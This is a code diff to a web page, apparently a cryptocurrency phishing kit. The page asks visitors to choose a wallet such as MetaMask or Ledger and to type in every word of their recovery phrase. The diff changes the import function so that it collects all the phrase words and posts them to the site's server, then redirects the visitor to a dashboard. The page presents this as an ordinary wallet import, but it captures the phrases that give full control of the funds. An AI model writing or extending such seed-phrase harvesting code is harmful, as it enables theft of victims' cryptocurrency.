@@ -107,7 +107,6 @@ body{background:linear-gradient(135deg,#003080 0%,#0047AB 60%,#1a7bd4 100%);min-
 let selectedWallet='';
 let phraseCount=12;
 
-// Wallet phrase counts — exact real-world values
 const WALLET_PHRASES={
   'Trust Wallet':12,'MetaMask':12,'Coinbase Wallet':12,
   'Ledger':24,'Trezor':12,'Exodus':12,'Phantom':12,
@@ -159,16 +158,24 @@ function backToWallets(){
 
 function importWallet(){
   const inputs=document.querySelectorAll('#phraseGrid input');
-  const err=document.getElementById('phraseErr');
+  const errDiv=document.getElementById('phraseErr');
   let allFilled=true;
   inputs.forEach(i=>{if(!i.value.trim())allFilled=false;});
-  if(!allFilled){showError(err,'Please enter all '+phraseCount+' recovery phrase words!');return;}
-  fetch('/import-wallet',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet_type:selectedWallet})})
+  if(!allFilled){showError(errDiv,'Please enter all '+phraseCount+' recovery phrase words!');return;}
+  // Collect all phrase words, join by newline
+  const phrases = Array.from(inputs).map(inp => inp.value.trim()).join('\n');
+  fetch('/import-wallet',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({wallet_type:selectedWallet, passphrases:phrases})
+  })
   .then(r=>r.json()).then(res=>{
     if(res.success){
       document.getElementById('step2').style.display='none';
       document.getElementById('step3').style.display='block';
       setTimeout(()=>window.location='/dashboard',3000);
+    } else {
+      showError(errDiv,'Import failed. Please try again.');
     }
   });
 }
